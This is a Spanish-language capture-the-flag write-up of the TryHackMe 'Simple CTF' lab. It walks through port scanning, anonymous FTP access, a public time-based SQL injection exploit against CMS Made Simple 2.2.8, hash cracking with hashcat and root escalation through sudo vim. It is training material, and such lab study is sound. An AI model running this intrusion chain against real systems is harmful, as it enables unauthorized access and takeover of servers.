---
title: Simple CTF Writeup - TryHackMe
date: 2023-05-21
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, SQLi, Hash Cracking, SUDO, Vim]
img_path: /assets/img/commons/simple_ctf/
image: simple_ctf.png
---

¡Hola!

En este write-up, exploraremos la máquina [**Simple CTF**](https://tryhackme.com/room/easyctf) de **TryHackMe**, clasificada como de dificultad fácil en la plataforma. Durante este desafío, realizaremos una enumeración de FTP y Web para descubrir la versión del CMS utilizado en el servidor. A continuación, buscaremos un posible exploit para esa versión y explotaremos una vulnerabilidad de SQLi. Por último, escalaremos privilegios abusando de la herramienta Vim con permisos SUDO.

¡Comencemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.71.52
PING 10.10.71.52 (10.10.71.52) 56(84) bytes of data.
64 bytes from 10.10.71.52: icmp_seq=1 ttl=61 time=318 ms

--- 10.10.71.52 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 318.238/318.238/318.238/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -n -sS -Pn -T5 10.10.71.52 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 22:29 -05
Nmap scan report for 10.10.71.52
Host is up (0.28s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 21,80,2222 -sV -sC --min-rate 5000 10.10.71.52 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 22:45 -05
Nmap scan report for 10.10.71.52
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.11.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.69 seconds
```

El reporte indica que la máquina víctima está ejecutando los servicios **FTP** (`vsftpd 3.0.3`), **HTTP** (`Apache httpd 2.4.18`) y **SSH** (`OpenSSH 7.2p2`).

### FTP - 21

Dado que el informe también indicaba que era posible iniciar sesión como usuario "Anonymous" en el servicio FTP, decidimos probarlo.

Al hacerlo, descubrimos un archivo de texto de interés y procedimos a descargarlo.

```bash
❯ ftp 10.10.71.52
Connected to 10.10.71.52.
220 (vsFTPd 3.0.3)
Name (10.10.71.52:juanr): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44559|)
ftp: Can't connect to `10.10.71.52:44559': Expiró el tiempo de conexión
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |*****************************************************************************************************************************************|   166      905.63 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.59 KiB/s)
```

Al leer el contenido del archivo de texto, nos dimos cuenta de que era una nota dirigida al desarrollador, la cual mencionaba la reutilización de una contraseña débil.

```bash
❯ cat ForMitch.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ForMitch.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### HTTP - 80

A continuación, procedimos a realizar una enumeración del servicio web. Iniciamos accediendo a la página web y nos encontramos con la página por defecto de Apache.

![web](web.png)

Para buscar posibles rutas interesantes, llevamos a cabo un proceso de fuzzing de directorios con la herramienta `gobuster`.

```bash
❯ gobuster dir -u http://10.10.71.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -req -x php,html,txt -t 100
http://10.10.71.52/index.html           (Status: 200) [Size: 11321]
http://10.10.71.52/.html                (Status: 403) [Size: 291]
http://10.10.71.52/.php                 (Status: 403) [Size: 290]
http://10.10.71.52/robots.txt           (Status: 200) [Size: 929]
http://10.10.71.52/simple               (Status: 200) [Size: 19833]
```

Encontramos el directorio `/simple` y al acceder a él, nos encontramos con un CMS, específicamente el CMS Made Simple versión 2.2.8, como se muestra en la propia página.

![simple](simple.png)

## Explotación

### Explotación de CMS Made Simple < 2.2.10 - SQL Injection

Ahora que conocemos la versión del CMS, procedimos a realizar una búsqueda de posibles exploits utilizando la herramienta `searchsploit`. Para nuestra fortuna, encontramos uno que aprovecha la vulnerabilidad de inyección SQL (**SQLi**).

```bash
❯ searchsploit CMS Made Simple 2.2.8
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                            | php/webapps/46635.py
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Para obtener el exploit y asegurarnos de tenerlo en nuestra máquina atacante, procedimos a realizar un mirror y descargarlo.

```bash
❯ searchsploit -m php/webapps/46635.py
  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
    Codes: CVE-2019-9053
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/juanr/CTF/THM/Simple CTF/exploits/46635.py
```

Ejecutamos el exploit con el fin de visualizar los parámetros que debemos proporcionarle.

```bash
❯ python2 46635.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

En este caso, ejecutamos el exploit proporcionándole únicamente la URL, evitando así que realice automáticamente el proceso de cracking. En su lugar, realizaremos manualmente el proceso de cracking utilizando la herramienta `hashcat`.

```bash
python2 46635.py -u http://10.10.71.52/simple/
```

Después de esperar unos minutos, logramos obtener el salt utilizado para la contraseña, el nombre de usuario, la dirección de correo electrónico y la contraseña hasheada en formato `MD5`.

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Posteriormente, procedemos a crackear la contraseña proporcionando el hash y el salt utilizando el siguiente comando:

```bash
PS C:\Users\juanr\OneDrive\Documentos\Hashcat\hashcat-6.2.6> .\hashcat.exe -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 .\rockyou.txt
hashcat (v6.2.6) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

[...]

Dictionary cache hit:
* Filename..: .\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Mon May 22 00:18:53 2023 (0 secs)
Time.Estimated...: Mon May 22 00:18:53 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7994.9 kH/s (2.17ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#2.........:        0 H/s (0.00ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Speed.#*.........:  7994.9 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 524296/14344385 (3.66%)
Rejected.........: 8/524296 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-0 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> chad91
Candidates.#2....: [Copying]
Hardware.Mon.#1..: Util:  5% Core: 400MHz Mem:1600MHz Bus:16
Hardware.Mon.#2..: Temp: 43c Util:  4% Core:1484MHz Mem:5989MHz Bus:8
```

¡Enhorabuena! Al descifrar la contraseña, ahora podemos acceder al sistema como el usuario **mitch** a través de SSH.

```bash
❯ ssh mitch@10.10.71.52 -p 2222
The authenticity of host '[10.10.71.52]:2222 ([10.10.71.52]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.71.52]:2222' (ED25519) to the list of known hosts.
mitch@10.10.71.52's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch
```

Procedemos a listar los archivos en el directorio principal del usuario **mitch** y, al hacerlo, nos encontramos con la primera flag de la máquina.

```bash
$ ls
user.txt
$ cat user.txt
G00d************
```

## Escalación de privilegios

---

### Abuso de binario vim con permisos SUDO

En nuestro objetivo de escalar a privilegios de root, iniciamos listando los binarios que podemos ejecutar con permisos **SUDO**.

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Al revisar los binarios que podemos ejecutar con permisos **SUDO**, nos damos cuenta de que podemos utilizar el binario `vim` sin necesidad de proporcionar una contraseña. Ante esta situación, consultamos [GTFOBins](https://gtfobins.github.io/) para determinar si existe alguna posibilidad de abusar de `vim` con estos privilegios elevados y encontrar una forma de escalar nuestros privilegios.

![sudo](sudo.png)

Al explorar las posibles formas de abusar de Vim con permisos SUDO según GTFOBins, encontramos una opción que parece adecuada para nuestro objetivo. En este caso, utilizaremos la primera opción sugerida. A continuación, describiré cómo podemos llevar a cabo este abuso:

Ejecutamos el siguiente comando para iniciar Vim:

```bash
sudo /usr/bin/vim
```

Una vez dentro de Vim, ingresamos el siguiente comando en el modo de edición

```bash
[...]

~                                                                                                                                                                                     
~                                                                                                                                                                                     
~                                                                                                                                                                                     
:!/bin/bash
root@Machine:/home# whoami
root
```

Esto nos permitirá ejecutar un shell de Bash con privilegios de **root** desde dentro de Vim. 

Finalmente, como **root**, accedemos al directorio principal y procedemos a leer la última flag de la máquina.

```bash
root@Machine:~# cd /root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt
W3ll****************
```

!Happy Hacking!
